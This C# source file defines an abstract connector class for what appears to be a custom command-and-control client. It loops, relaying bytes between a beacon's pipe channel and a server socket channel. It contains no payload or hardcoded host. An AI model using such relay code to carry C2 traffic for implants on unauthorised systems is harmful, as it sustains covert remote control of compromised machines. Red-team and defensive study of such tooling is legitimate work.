using System;
using System.Threading;
using ClientC2.interfaces;

namespace ClientC2.connectors
{
    public abstract class BaseConnector
    {
        protected BaseConnector(IC2Channel beaconChannel, IC2Channel serverChannel, int sleep)
        {
            BeaconChannel = beaconChannel;
            ServerChannel = serverChannel;
            Sleep = sleep;
        }
        public bool Is64Bit => IntPtr.Size == 8;

        public bool Started { get; private set; }

        public IC2Channel BeaconChannel { get; protected set; }

        public IC2Channel ServerChannel { get; protected set; }
        public int Sleep { get; protected set; }

        public abstract Func<bool> Initialize { get; }

        public void Go()
        {
            try
            {
                if (!Initialize())
                    throw new Exception("C2 connector was not initialized...");

                if (!ServerChannel.Connected)
                    throw new Exception("Server Channel is not connected");

                if (!BeaconChannel.Connected)
                    throw new Exception("Beacon Channel is not connected");

                Started = true;
                while (true)
                {
                    if (!BeaconChannel.ReadAndSendTo(ServerChannel)) break;
                    if (!ServerChannel.ReadAndSendTo(BeaconChannel)) break;
                    Thread.Sleep(Sleep);
                }
                Console.WriteLine("[!] Stopping loop, no bytes received");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Exception occured: {ex.Message}");
            }
            finally
            {
                Stop();
            }
        }
        public void Stop()
        {
            Started = false;

            Console.WriteLine("[-] Closing pipe connection");
            BeaconChannel?.Close();

            Console.WriteLine("[-] Closing socket connection");
            ServerChannel?.Close();
        }
    }
}
